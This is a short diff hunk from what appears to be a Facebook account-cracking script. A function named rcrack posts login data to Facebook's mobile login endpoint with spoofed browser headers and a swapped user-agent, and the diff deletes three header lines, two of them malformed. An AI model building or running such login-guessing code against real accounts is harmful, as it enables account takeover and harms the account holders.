@@ -271,9 +271,6 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
-            'pragma": 'no-cache',
-            'priority": 'u=1',
-            'cross-origin-resource-policy': 'cross-origin',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
             lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
